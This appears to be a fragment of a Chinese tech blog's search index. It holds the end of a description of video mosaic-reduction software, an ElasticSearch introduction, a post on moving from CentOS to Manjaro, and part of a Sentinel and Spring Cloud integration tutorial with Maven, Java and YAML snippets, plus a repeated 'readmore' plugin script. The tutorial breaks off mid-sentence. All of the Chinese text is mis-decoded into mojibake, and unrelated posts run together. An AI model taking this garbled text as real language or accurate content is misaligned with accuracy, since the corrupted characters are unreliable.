å¤„ç†è®¾ç½®é€‚ç”¨äºæ•´ä¸ªè§†é¢‘ï¼Œå¯ä»¥ä¸ºæ¯ä¸ªéƒ¨åˆ†å•ç‹¬è®¾ç½®äº§å“ç‰ˆæœ¬ VR æ¨¡å¼ä¸‹çš„é©¬èµ›å…‹å‡å°‘æœ€å¤š 10 åˆ†é’Ÿï¼Œå¦‚æœè¶…å‡ºåˆ™ç»§ç»­æ²¡æœ‰é©¬èµ›å…‹å‡å°‘ å…¶ä»–è¯´æ˜ å¦‚æœèƒŒæ™¯æ˜¯ç½‘æ ¼å›¾æ¡ˆï¼Œåˆ™å¯ä»¥å¤„ç†æ•´ä¸ªå±å¹• å¦‚æœè§†é¢‘è´¨é‡å¤ªä½ï¼Œåˆ™æ— æ³•æ£€æµ‹åˆ°é©¬èµ›å…‹ï¼Œå¹¶ä¸”ä¸ä¼šæ˜¾ç¤ºæ•ˆæœ æ— æ³•æ’­æ”¾å— DRM ä¿æŠ¤çš„è§†é¢‘ï¼Œä½†å¯ä»¥ä½¿ç”¨å®æ—¶æ•è·æ¥å¤„ç†å®ƒä»¬ å®ƒæ”¯æŒ mp4ã€wmvã€mkvã€aviã€jpgã€pngï¼Œä½†æœ‰äº›è§†é¢‘ç”±äºç¼–è§£ç å™¨è€Œæ— æ³•æ’­æ”¾ äº§å“ç¼ºç‚¹ æ— æ³•æ¢å¤é¢„é•¶åµŒçŠ¶æ€ å­˜åœ¨å›¾åƒè´¨é‡ä½çš„æ—§è§†é¢‘æˆ–å…·æœ‰ç‰¹æ®Šé©¬èµ›å…‹å¤„ç†çš„è§†é¢‘çš„ä¸è‰¯æƒ…å†µ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ai"},{title:"ElasticSearch å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡",url:"/posts/5ab118a5.html",text:'ElasticSearch çš„æ¦‚è¿° ElasticSearch æ˜¯åŸºäº RESTful æ ‡å‡†çš„é«˜æ‰©å±•é«˜å¯ç”¨çš„å®æ—¶æ•°æ®åˆ†æçš„å…¨æ–‡æœç´¢å·¥å…·ã€‚å®ƒæä¾›äº†ä¸€ä¸ªåˆ†å¸ƒå¼å¤šç”¨æˆ·èƒ½åŠ›çš„å…¨æ–‡æœç´¢å¼•æ“ï¼ŒåŸºäº RESTful æ¥å£ã€‚ElasticSearch æ˜¯åœ¨ Lucene çš„åŸºç¡€ä¸Šç”¨ Java å¼€å‘çš„ï¼Œå¹¶ä½œä¸º Apache è®¸å¯æ¡æ¬¾ä¸‹çš„å¼€æ”¾æºç å‘å¸ƒï¼Œæ˜¯å½“å‰æµè¡Œçš„ä¼ä¸šçº§æœç´¢å¼•æ“ã€‚Elasticsearch åœ¨äº‘è®¡ç®—ä¸­ï¼Œæ‹¥æœ‰å®æ—¶æœç´¢ã€ç¨³å®šã€å¯é ã€å¿«é€Ÿã€å®‰è£…ä½¿ç”¨æ–¹ä¾¿ç­‰ä¼˜åŠ¿ã€‚æ„å»ºåœ¨å…¨æ–‡æ£€ç´¢å¼€æºè½¯ä»¶ Lucene ä¹‹ä¸Šçš„ Elasticsearchï¼Œä¸ä»…èƒ½å¯¹æµ·é‡è§„æ¨¡çš„æ•°æ®å®Œæˆåˆ†å¸ƒå¼ç´¢å¼•ä¸æ£€ç´¢ï¼Œè¿˜èƒ½æä¾›æ•°æ®èšåˆåˆ†æçš„åŠŸèƒ½ã€‚ ElasticSearch çš„åŸºæœ¬æ¦‚å¿µ Index - ç±»ä¼¼äº MySQL æ•°æ®åº“ä¸­çš„ database Type - ç±»ä¼¼äº MySQL æ•°æ®åº“ä¸­çš„ tableï¼ŒES ä¸­å¯ä»¥åœ¨ Index ä¸­å»ºç«‹ Typeï¼Œé€šè¿‡ mapping è¿›è¡Œæ˜ å°„ Document - ç”±äº ES å­˜å‚¨çš„æ•°æ®æ˜¯æ–‡æ¡£ç±»å‹çš„ï¼Œä¸€æ¡æ•°æ®å¯¹åº”ä¸€ä¸ªæ–‡æ¡£ï¼Œç›¸å½“äº MySQL æ•°æ®åº“ä¸­çš„ä¸€è¡Œæ•°æ® row Field - ES ä¸­ä¸€ä¸ªæ–‡æ¡£ä¸­å¯ä»¥æœ‰å¤šä¸ªå­—æ®µï¼Œç›¸å½“äº MySQL æ•°æ®åº“ä¸€è¡Œå¯ä»¥æœ‰å¤šåˆ— Mapping - å¯ä»¥ç†è§£ä¸º MySQL æˆ–è€… Solr ä¸­å¯¹åº”çš„ schemaï¼Œåªä¸è¿‡æœ‰äº›æ—¶å€™ ES ä¸­çš„ mapping å¢åŠ äº†åŠ¨æ€è¯†åˆ«åŠŸèƒ½ï¼Œå®é™…ç”Ÿäº§ç¯å¢ƒä¸Šä¸å»ºè®®ä½¿ç”¨ï¼Œæœ€å¥½è¿˜æ˜¯å¼€å§‹å°±åˆ¶å®šå¥½äº†å¯¹åº”çš„ schema Indexed - åä¹‰ä¸Šçš„ç´¢å¼•å»ºç«‹ï¼ŒMySQL ä¸­ä¸€èˆ¬ä¼šå¯¹ç»å¸¸ä½¿ç”¨çš„åˆ—å¢åŠ ç›¸åº”çš„ç´¢å¼•ç”¨äºæé«˜æŸ¥è¯¢é€Ÿåº¦ï¼Œè€Œåœ¨ ES ä¸­é»˜è®¤éƒ½æ˜¯ä¼šåŠ ä¸Šç´¢å¼•çš„ï¼Œé™¤éç‰¹æ®Šåˆ¶å®šä¸å»ºç«‹ç´¢å¼•åªæ˜¯è¿›è¡Œå­˜å‚¨ç”¨äºå±•ç¤ºï¼Œè¿™ä¸ªéœ€è¦æ ¹æ®å…·ä½“çš„éœ€æ±‚å’Œä¸šåŠ¡è¿›è¡Œè®¾å®š Query DSL - ç±»ä¼¼äº MySQL çš„ SQL è¯­å¥ï¼Œåªä¸è¿‡åœ¨ ES ä¸­æ˜¯ä½¿ç”¨çš„ JSON æ ¼å¼çš„æŸ¥è¯¢è¯­å¥ï¼Œå³ QueryDSL ElasticSearch çš„åŸºæœ¬æ¶æ„ Gateway å±‚ï¼šES ç”¨æ¥å­˜å‚¨ç´¢å¼•æ–‡ä»¶çš„ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸”å®ƒæ”¯æŒå¾ˆå¤šç±»å‹ï¼Œä¾‹å¦‚ï¼šæœ¬åœ°ç£ç›˜ã€å…±äº«å­˜å‚¨ï¼ˆåš Snapshot çš„æ—¶å€™éœ€è¦ç”¨åˆ°ï¼‰ã€Hadoop çš„ HDFS åˆ†å¸ƒå¼å­˜å‚¨ã€äºšé©¬é€Šçš„ S3ã€‚å®ƒçš„ä¸»è¦èŒè´£æ˜¯ç”¨æ¥å¯¹æ•°æ®è¿›è¡Œé•¿æŒä¹…åŒ–ä»¥åŠæ•´ä¸ªé›†ç¾¤é‡å¯ä¹‹åå¯ä»¥é€šè¿‡ Gateway é‡æ–°æ¢å¤æ•°æ®ã€‚ Distributed Lucene Directoryï¼šGateway ä¸Šå±‚å°±æ˜¯ä¸€ä¸ª Lucene çš„åˆ†å¸ƒå¼æ¡†æ¶ï¼ŒLucene æ˜¯åšæ£€ç´¢çš„ï¼Œä½†æ˜¯å®ƒæ˜¯ä¸€ä¸ªå•æœºçš„æœç´¢å¼•æ“ï¼Œåƒè¿™ç§ ES åˆ†å¸ƒå¼æœç´¢å¼•æ“ç³»ç»Ÿï¼Œè™½ç„¶åº•å±‚ç”¨ Luceneï¼Œä½†æ˜¯éœ€è¦åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šéƒ½è¿è¡Œ Lucene è¿›è¡Œç›¸åº”çš„ç´¢å¼•ã€æŸ¥è¯¢ä»¥åŠæ›´æ–°ï¼Œæ‰€ä»¥éœ€è¦åšæˆä¸€ä¸ªåˆ†å¸ƒå¼çš„è¿è¡Œæ¡†æ¶æ¥æ»¡è¶³ä¸šåŠ¡çš„éœ€è¦ã€‚ å››å¤§æ¨¡å—ç»„ä»¶ï¼šDistricted Lucene Directory ä¹‹ä¸Šå°±æ˜¯ä¸€äº› ES çš„æ¨¡å—ï¼ŒIndex Module æ˜¯ç´¢å¼•æ¨¡å—ï¼Œå°±æ˜¯å¯¹æ•°æ®å»ºç«‹ç´¢å¼•ä¹Ÿå°±æ˜¯é€šå¸¸æ‰€è¯´çš„å»ºç«‹ä¸€äº›å€’æ’ç´¢å¼•ç­‰ï¼›Search Module æ˜¯æœç´¢æ¨¡å—ï¼Œå°±æ˜¯å¯¹æ•°æ®è¿›è¡ŒæŸ¥è¯¢æœç´¢ï¼›Mapping æ¨¡å—æ˜¯æ•°æ®æ˜ å°„ä¸è§£ææ¨¡å—ï¼Œå°±æ˜¯ä½ çš„æ•°æ®çš„æ¯ä¸ªå­—æ®µå¯ä»¥æ ¹æ®ä½ å»ºç«‹çš„è¡¨ç»“æ„é€šè¿‡ Mapping è¿›è¡Œæ˜ å°„è§£æï¼Œå¦‚æœæ²¡æœ‰å»ºç«‹è¡¨ç»“æ„ï¼ŒES å°±ä¼šæ ¹æ®æ•°æ®ç±»å‹æ¨æµ‹æ•°æ®ç»“æ„ä¹‹åè‡ªå·±ç”Ÿæˆä¸€ä¸ª Mappingï¼Œç„¶åéƒ½æ˜¯æ ¹æ®è¿™ä¸ª Mapping è¿›è¡Œè§£ææ•°æ®ï¼›River æ¨¡å—åœ¨ ES2.0 ä¹‹ååº”è¯¥æ˜¯è¢«å–æ¶ˆäº†ï¼Œå®ƒçš„æ„æ€è¡¨ç¤ºæ˜¯ç¬¬ä¸‰æ–¹æ’ä»¶ï¼Œä¾‹å¦‚å¯ä»¥é€šè¿‡ä¸€äº›è‡ªå®šä¹‰çš„è„šæœ¬å°†ä¼ ç»Ÿçš„æ•°æ®åº“ï¼ˆMySQLï¼‰ç­‰æ•°æ®æºé€šè¿‡æ ¼å¼åŒ–è½¬æ¢åç›´æ¥åŒæ­¥åˆ° ES é›†ç¾¤é‡Œï¼Œè¿™ä¸ª River å¤§éƒ¨åˆ†æ˜¯è‡ªå·±å†™çš„ï¼Œå†™å‡ºæ¥çš„ä¸œè¥¿è´¨é‡å‚å·®ä¸é½ï¼Œå°†è¿™äº›ä¸œè¥¿é›†æˆåˆ° ES ä¸­ä¼šå¼•å‘å¾ˆå¤šå†…éƒ¨ Bugï¼Œä¸¥é‡å½±å“äº† ES çš„æ­£å¸¸åº”ç”¨ï¼Œæ‰€ä»¥åœ¨ ES2.0 ä¹‹åè€ƒè™‘å°†å…¶å»æ‰ã€‚ Discoveryã€Scriptingï¼šES å››å¤§æ¨¡å—ç»„ä»¶ä¹‹ä¸Šæœ‰ Discovery æ¨¡å—ï¼šES æ˜¯ä¸€ä¸ªé›†ç¾¤åŒ…å«å¾ˆå¤šèŠ‚ç‚¹ï¼Œå¾ˆå¤šèŠ‚ç‚¹éœ€è¦äº’ç›¸å‘ç°å¯¹æ–¹ï¼Œç„¶åç»„æˆä¸€ä¸ªé›†ç¾¤åŒ…æ‹¬é€‰ä¸»çš„ï¼Œè¿™äº› ES éƒ½æ˜¯ç”¨çš„ Discovery æ¨¡å—ï¼Œé»˜è®¤ä½¿ç”¨çš„æ˜¯ Zenï¼Œä¹Ÿå¯æ˜¯ä½¿ç”¨ EC2ï¼›ES æŸ¥è¯¢è¿˜å¯ä»¥æ”¯æ’‘å¤šç§ Script å³è„šæœ¬è¯­è¨€ï¼ŒåŒ…æ‹¬ Mvelã€JSã€Python ç­‰ã€‚ Transport åè®®å±‚ï¼šå†ä¸Šä¸€å±‚å°±æ˜¯ ES çš„é€šè®¯æ¥å£ Transportï¼Œæ”¯æŒçš„ä¹Ÿæ¯”è¾ƒå¤šï¼šThriftã€Memcached ä»¥åŠ Httpï¼Œé»˜è®¤çš„æ˜¯ Httpï¼ŒJMX å°±æ˜¯ Java çš„ä¸€ä¸ªè¿œç¨‹ç›‘æ§ç®¡ç†æ¡†æ¶ï¼Œå› ä¸º ES æ˜¯é€šè¿‡ Java å®ç°çš„ã€‚ RESTful æ¥å£å±‚ï¼šæœ€ä¸Šå±‚å°±æ˜¯ ES æš´éœ²å‡ºæ¥çš„è®¿é—®æ¥å£ï¼Œå®˜æ–¹æ¨èçš„æ–¹æ¡ˆå°±æ˜¯è¿™ç§ RESTful æ¥å£ï¼Œç›´æ¥å‘é€ Http è¯·æ±‚ï¼Œæ–¹ä¾¿åç»­ä½¿ç”¨ Nginx åšä»£ç†ã€åˆ†å‘åŒ…æ‹¬å¯èƒ½åç»­ä¼šåšæƒé™çš„ç®¡ç†ï¼Œé€šè¿‡ Http å¾ˆå®¹æ˜“åšè¿™æ–¹é¢çš„ç®¡ç†ã€‚å¦‚æœä½¿ç”¨ Java å®¢æˆ·ç«¯å®ƒæ˜¯ç›´æ¥è°ƒç”¨ Apiï¼Œåœ¨åšè´Ÿè½½å‡è¡¡ä»¥åŠæƒé™ç®¡ç†è¿˜æ˜¯ä¸å¤ªå¥½åšã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼"},{title:"Manjaro å…¥å‘å‰çš„ç¢ç¢å¿µ",url:"/posts/3d242d5c.html",text:'CentOS ä½¿ç”¨ä½“éªŒ ä½¿ç”¨ Linux ç³»ç»Ÿå·²ç»å¾ˆå¤šå¹´äº†ï¼ŒCentOS/Debian/Ubuntu éƒ½æœ‰æ¥è§¦è¿‡ï¼Œå…¶ä¸­ CentOS ä½¿ç”¨çš„æ—¶é—´æœ€é•¿äº†ï¼Œä» CentOS6 åˆ° CentOS7 é™†é™†ç»­ç»­ç”¨äº†æœ‰å…­ä¸ƒå¹´ã€‚æŠ›å¼€å…¶ä»–æ–¹é¢ä¸è¯´ï¼ŒDebian/Ubuntu éƒ½æ˜¯å¾ˆä¼˜ç§€çš„ Linux å‘è¡Œç‰ˆï¼Œç”±äºè¿™ä¹ˆå¤šå¹´æ¥å…¬å¸çš„æœåŠ¡å™¨éƒ½æ˜¯æ ‡é… CentOSï¼Œå› æ­¤å½“åˆä¸ºäº†è¸©æ›´å¤šçš„å‘ï¼Œå°±ä¸€ç›´åšæŒä½¿ç”¨ CentOSã€‚å½“å¹´çš„ç›®æ ‡å¾ˆå•çº¯ä¹Ÿå¾ˆçº¯ç²¹ï¼Œä¸ºçš„å°±æ˜¯å¸Œæœ›åœ¨ä¼ä¸šçš„ç”Ÿäº§ç¯å¢ƒæ›´èƒ½å¾—å¿ƒåº”æ‰‹ã€‚CentOS ç»§æ‰¿äº† RedHat çš„è¡€ç»Ÿï¼Œæ— è®ºæ˜¯ä½œä¸ºä¼ä¸šæœåŠ¡å™¨è¿˜æ˜¯æ—¥å¸¸ä½¿ç”¨çš„å¼€å‘æœºï¼Œéƒ½èƒ½èƒœä»»å¤§å¤šæ•°ä½¿ç”¨åœºæ™¯äº†ã€‚å”¯ä¸€éœ€è¦åæ§½çš„å¯èƒ½å°±æ˜¯å†…æ ¸ç‰ˆæœ¬å¾ˆä½ã€è½¯ä»¶ç‰ˆæœ¬æ¯”è¾ƒæ—§ã€è½¯ä»¶èµ„æºå°‘ï¼Œä½†æ­£æ˜¯è¿™æ ·æ‰å‡¸æ˜¾äº† CentOS çš„ç¨³å®šæ€§ï¼Œæ¯•ç«Ÿå¯¹ä¼ä¸šæœåŠ¡å™¨æ¥è¯´ï¼Œç¨³å®šæ€§å‹å€’ä¸€åˆ‡ã€‚å¦‚æœå¸Œæœ›å¾—åˆ°åƒ Archã€Deppinã€Elementary OS é‚£æ ·æ‹¥æœ‰ç‚«é…·ç•Œé¢ã€ä¸°å¯Œçš„è½¯ä»¶ã€æ»šåŠ¨æ›´æ–°ç­‰ç‰¹æ€§ï¼Œé‚£ä¹ˆ CentOS ç¡®å®ä¸é€‚åˆè¿™ç±»ç”¨æˆ·ã€‚CentOS é»˜è®¤ä½¿ç”¨ GNOME ä½œä¸ºæ¡Œé¢ç¯å¢ƒï¼Œè€Œ GNOME Shell çš„ç¤¾åŒºæ‹¥æœ‰å¤§é‡å¼€æºæ’ä»¶ï¼Œå› æ­¤èŠ±ç‚¹æ—¶é—´ä¹Ÿå¯ä»¥å°† CentOS æŠ˜è…¾å¾—æ¯”è¾ƒæ»¡æ„ã€‚ä¾‹å¦‚ç»è¿‡æ˜¾å¡é©±åŠ¨ä¼˜åŒ–ã€GNOME æ¡Œé¢ç¾åŒ–ã€è¾“å…¥æ³•æ›´æ¢ã€å£çº¸æ›´æ¢ã€é…ç½® Zshã€Guake åï¼Œå¯ä»¥è¾¾åˆ°æ¯”è¾ƒæ»¡æ„çš„ç•Œé¢ä½“éªŒï¼Œè€Œ CentOS æ¡Œé¢è½¯ä»¶å°‘çš„é—®é¢˜ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ Snapã€Flatpak é—´æ¥å¾—åˆ°ç¼“è§£ã€‚ æ”¾å¼ƒ CentOS çš„åŸå›  ç”±äºç¬”è€…åœ¨ 2019 å¹´ 9 æœˆåˆæ›´æ¢äº†ä¸€æ¬¾è¶…å®½å±çš„æ˜¾ç¤ºå™¨ï¼ŒåŒæ—¶ä¹Ÿå‡çº§äº†æ˜¾å¡ï¼Œç¡¬ä»¶å‡çº§ä¹‹åæƒ³å½“ç„¶åœ°å¸Œæœ›è·å¾—æ›´å¥½çš„ä½¿ç”¨ä½“éªŒã€‚å½“æ—¶å·²ç»å¼€å§‹ä¸æ»¡è¶³äº CentOS çš„ç°çŠ¶äº†ï¼Œäºæ˜¯å¿ƒä¸­èŒå‘äº†è½¬æŠ• Manjaro çš„æƒ³æ³•ï¼Œä½†åŸ CentOS ç³»ç»Ÿé‡Œå·²ç»æ­å»ºäº†æ—¥å¸¸ä½¿ç”¨çš„å¼€å‘ç¯å¢ƒï¼ˆåŒ…æ‹¬å„ç§ç¼–ç¨‹ç¯å¢ƒã€IDEã€å·¥å…·é“¾ç­‰ï¼‰ï¼Œå¯¹äºæ‡’ç™Œæ™šæœŸçš„ç¬”è€…æ¥è¯´ï¼Œæ›´æ¢ç³»ç»Ÿæ„å‘³ç€é‡æ–°æ­å»ºå¼€å‘ç¯å¢ƒï¼Œå› æ­¤æ›´æ¢ç³»ç»Ÿçš„äº‹æƒ…å°±è¢«æç½®äº†ã€‚åˆšå¥½ CentOS å®˜æ–¹åœ¨ 2019 å¹´ 10 æœˆå‘å¸ƒäº† CentOS8 å’Œ CentOS Streamsï¼ŒåŠ å…¥äº†å¤§é‡çš„æ–°ç‰¹æ€§ï¼Œæ˜¯ä¸€æ¬¾éå¸¸å€¼å¾—æœŸå¾…çš„ Linux ç³»ç»Ÿã€‚é—æ†¾çš„æ˜¯ CentOS å®˜æ–¹å‘æ¥ä¸æ”¯æŒå¤§ç‰ˆæœ¬æ›´æ–°ï¼Œä¹Ÿå°±æ˜¯æ— æ³•ä» CentOS7 ç›´æ¥æ›´æ–°åˆ° CentOS8ã€‚å¦‚æœéå¾—ä½¿ç”¨ CentOS8 çš„è¯ï¼Œæ­¤æ—¶åªèƒ½é‡æ–°å…¨ç›˜å®‰è£…ï¼Œè€Œå…¨ç›˜å®‰è£…ä¹Ÿæ„å‘³ç€ä»¥å‰çš„å¼€å‘ç¯å¢ƒè¿˜æ˜¯è¦é‡æ–°æ­å»ºã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œè¦æ˜¯å¤šå¹´ä»¥å CentOS9 å‘å¸ƒäº†ï¼Œå²‚ä¸æ˜¯åˆè¦é‡æ–°å®‰è£…å˜›ã€‚è€ƒè™‘åˆ°ç¡¬ä»¶å‡çº§ + Centos8 ç³»ç»Ÿå‘å¸ƒå¸¦æ¥çš„å¥‘æœºï¼Œè½¬æŠ• Manjaro çš„è½¬æŠ˜ç‚¹ç»ˆäºåˆ°äº†ï¼Œä½†æ˜¯ç¬”è€…å¹¶ä¸æ˜¯ä»¥åéƒ½ä¸ä½¿ç”¨ CentOSï¼Œåªæ˜¯åœ¨è‡ªå·±çš„å¼€å‘æœºä¸Šä¸å†å®‰è£… CentOSï¼Œæ—¥åçš„å·¥ä½œä¸­ä¾ç„¶æ˜¯ç¦»ä¸å¼€ CentOS ç³»ç»Ÿã€‚ è½¬æŠ• Manjaro çš„åŸå›  Manjaro è§£å†³äº†ç¬”è€…æœ€é‡è¦çš„ä¸¤ä¸ªç—›ç‚¹ï¼Œä¸€æ˜¯æ”¯æŒç¨³å®šçš„æ»šåŠ¨æ›´æ–°ï¼ŒäºŒæ˜¯ç¤¾åŒºæ‹¥æœ‰å¤§é‡çš„è½¯ä»¶ï¼ˆAURã€Snapã€Flatpakï¼‰ï¼Œè€Œä¸”å®˜æ–¹é»˜è®¤æä¾›äº†ä¸‰æ¬¾ï¼ˆXFCEã€KDEã€GNOMEï¼‰ä¼˜ç§€çš„æ¡Œé¢ç¯å¢ƒï¼Œç¤¾åŒºä¹Ÿæœ‰æä¾›å¤šæ¬¾éå¸¸ä¼˜ç§€çš„æ¡Œé¢ç¯å¢ƒï¼ˆMATEã€Bspwmã€Budgieã€Cinnamonã€Deepinï¼‰ã€‚ Manjaro çš„ä¼˜ç‚¹ WiKi éå¸¸å®Œå–„ ä¸°å¯Œçš„æ¡Œé¢ç¯å¢ƒ ç¨³å®šçš„æ»šåŠ¨æ›´æ–° å¯å®šåˆ¶åŒ–ç¨‹åº¦é«˜ AURï¼Œè½¯ä»¶èµ„æºä¸°å¯Œ ç¡¬ä»¶è®¾å®šåŠå†…æ ¸ç®¡ç†æ”¯æŒ æœªå®Œå¾…ç»­ å…ˆå†™åˆ°è¿™é‡Œï¼Œç­‰æ›´æ¢äº† Manjaro å†å” å¨ï¼Œæ¯•ç«Ÿå®‰è£…æ–°çš„ç³»ç»Ÿåï¼Œè¿˜éœ€è¦ä¸€æ®µè¾ƒé•¿çš„ç£¨åˆæ—¶é—´æ‰èƒ½ç”¨å¾—çˆ½ï¼Œä¸è¿‡æ‹–å»¶ç—‡è›®ä¸¥é‡çš„ï¼Œä¹Ÿä¸çŸ¥é“å“ªå¤©æ‰èƒ½çœŸçš„è½¬æŠ• Manjaro ã€‚ã€‚ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"manjaro"},{title:"Sentinel å…¥é—¨æ•™ç¨‹ - æ•´åˆç¯‡",url:"/posts/63e3926c.html",text:'å‰è¨€ä¸ºäº†å‡å°‘å¼€å‘çš„å¤æ‚åº¦ï¼ŒSentinel å¯¹å¤§éƒ¨åˆ†çš„ä¸»æµæ¡†æ¶ï¼Œä¾‹å¦‚ Web Servletã€Dubboã€Spring Cloudã€gRPCã€Spring WebFluxï¼ŒReactor ç­‰éƒ½åšäº†é€‚é…ï¼Œåªéœ€è¦å¼•å…¥å¯¹åº”çš„ä¾èµ–å³å¯æ–¹ä¾¿çš„æ•´åˆ Sentinelã€‚å¦‚æœè¦å®ç° Spring Cloud å’Œ Sentinel çš„æ•´åˆï¼Œå¯ä»¥é€šè¿‡å¼•å…¥ Spring Cloud Alibaba Sentinel æ¥æ•´åˆ Sentinelã€‚Spring Cloud Alibaba æ˜¯é˜¿é‡Œå·´å·´å¼€æºçš„ï¼Œè‡´åŠ›äºæä¾›å¾®æœåŠ¡å¼€å‘çš„ä¸€ç«™å¼è§£å†³æ–¹æ¡ˆã€‚Spring Cloud Alibaba é»˜è®¤ä¸º Sentinel æ•´åˆäº† Servletã€RestTemplateã€FeignClient å’Œ Spring WebFluxã€‚Sentinel åœ¨ Spring Cloud ç”Ÿæ€ä¸­ï¼Œä¸ä»…è¡¥å…¨äº† Hystrix åœ¨ Servlet å’Œ RestTemplate è¿™ä¸€å—ç©ºç™½ï¼Œè€Œä¸”è¿˜å®Œå…¨å…¼å®¹äº† Hystrix åœ¨ FeignClient ä¸­é™æµé™çº§çš„ç”¨æ³•ï¼Œå¹¶ä¸”æ”¯æŒè¿è¡Œæ—¶çµæ´»åœ°é…ç½®å’Œè°ƒæ•´é™æµé™çº§è§„åˆ™ã€‚ Sentinel æ•´åˆ Spring Cloud1.0ã€ç‰ˆæœ¬è¯´æ˜æœ¬æ¡ˆä¾‹ä½¿ç”¨å„å¼€æºç»„ä»¶çš„ç‰ˆæœ¬è¯´æ˜å¦‚ä¸‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç  Sentinel 1.8.0 Spring Boot 2.1.18.RELEASE Spring Cloud Greenwich.SR6 Spring Cloud Alibaba Sentinel 2.1.3.RELEASE 1.1ã€å¼•å…¥ Maven ä¾èµ–æ·»åŠ  spring-cloud-starter-alibaba-sentinel ä¾èµ– 1234567891011121314151617181920212223242526272829303132&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 1.2ã€åˆ›å»ºä¸»å¯åŠ¨ç±»1234567@SpringBootApplicationpublic class SentinelApplication { public static void main(String[] args) { SpringApplication.run(SentinelApplication.class, args); }} 1.3ã€åˆ›å»º Controller æµ‹è¯•ç±»12345678910111213141516171819202122232425262728@RestControllerpublic class TestController { /** * å®šä¹‰èµ„æº * valueï¼šèµ„æºåç§° * blockHandlerï¼šé™æµå¤„ç†çš„æ–¹æ³• * * @return */ @SentinelResource(value = "Hello", blockHandler = "exceptionHandler") @GetMapping("/hello") public String hello() { // ä½¿ç”¨é™æµè§„åˆ™ return "Hello Sentinel!"; } /** * åŸæ–¹æ³•è¢«é™æµçš„æ—¶å€™è°ƒç”¨æ­¤æ–¹æ³• * * @param e * @return */ public String exceptionHandler(BlockException e) { e.printStackTrace(); return "ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å€™ ..."; }} 1.4ã€é…ç½® Sentinel æ§åˆ¶å°åœ¨ application.yml é…ç½®æ–‡ä»¶é‡Œï¼ŒæŒ‡å®š Sentinel æ§åˆ¶å°çš„åœ°å€å’Œç«¯å£ 12345678910server: port: 8080spring: application: name: sentinel-spring-cloud cloud: sentinel: transport: dashboard: 127.0.0.1:9000 1.5ã€æµ‹è¯•ä»£ç  1ï¼‰å¯åŠ¨ Sentinel æ§åˆ¶å° 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar 2ï¼‰å¯åŠ¨ Spring Cloud åº”ç”¨ï¼Œæµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/helloï¼Œè‹¥å“åº”ç»“æœè¿”å› Hello Sentinel!ï¼Œè¯´æ˜åº”ç”¨å¯åŠ¨æˆåŠŸ 3ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:9000ï¼Œæ‰“å¼€ Sentinel 